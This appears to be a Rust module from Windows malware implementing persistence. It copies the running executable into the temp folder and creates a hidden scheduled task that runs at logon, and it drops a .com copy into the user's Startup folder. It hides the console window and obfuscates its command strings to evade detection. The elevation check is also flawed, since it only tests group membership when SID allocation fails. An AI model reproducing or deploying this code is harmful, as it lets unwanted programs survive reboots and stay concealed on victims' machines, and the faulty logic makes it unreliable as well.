use std::os::windows::process::CommandExt;

use windows::Win32::Security::{SID_IDENTIFIER_AUTHORITY, SECURITY_NT_AUTHORITY, AllocateAndInitializeSid, CheckTokenMembership, FreeSid};




pub unsafe fn is_elevated() -> bool {
    let mut is_admin;
    let mut admins_group = std::mem::MaybeUninit::uninit();
    let mut nt_authority = SID_IDENTIFIER_AUTHORITY {
        Value: SECURITY_NT_AUTHORITY.Value,
    };

    is_admin = AllocateAndInitializeSid(
        &mut nt_authority,
        2,
        32u32,
        544u32,
        0,
        0,
        0,
        0,
        0,
        0,
        admins_group.as_mut_ptr(),
    ).is_ok();

    if !is_admin {

        let admins_group = admins_group.assume_init();
        let ptr = &mut is_admin as *mut bool as *mut _;
        if CheckTokenMembership(None, admins_group, ptr).is_err() {
            is_admin = false;
        }
        FreeSid(admins_group);
    }

    is_admin
}


pub fn enable_persistance(name: &str) {
    unsafe {
        if is_elevated() {
           let _ = add_schtasks(name);            
           let _ = toggle_autostart(name);

        } else {
            let _ = toggle_autostart(name);
        }
    }
}

fn add_schtasks(name: &str) -> Result<(), std::io::Error> {
    let current_path = std::env::current_exe()?;
    let tmp = std::env::temp_dir();
    let full_path = format!("{}\\{name}", tmp.to_string_lossy());
    std::fs::copy(current_path, &full_path)?;


    let _ = std::process::Command::new(obfstr::obfstr!("cmd.exe")).creation_flags(0x08000000) // Detached Process, Dont show cmd
        .arg("/c")
        .arg(format!(
            "{} {full_path} {} {name} /IT",
            obfstr::obfstr!("schtasks /Create /TR"),
            obfstr::obfstr!("/SC ONLOGON /TN")
        ))
        .spawn()
        .expect("Error"); // fuck this garbage code uwu
        
        Ok(())
}



pub unsafe fn toggle_autostart(name: &str) -> Result<(), std::io::Error> {
 

  
    let current_path = std::env::current_exe()?;



   



    let path = format!("{}\\{}", std::env::var("APPDATA").unwrap(), obfstr::obfstr!("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"));


        std::thread::sleep(std::time::Duration::from_secs(15));
        std::fs::copy(current_path.display().to_string().replace(r"\\?\", ""), format!("{path}\\{name}.com"))?;

    Ok(())
}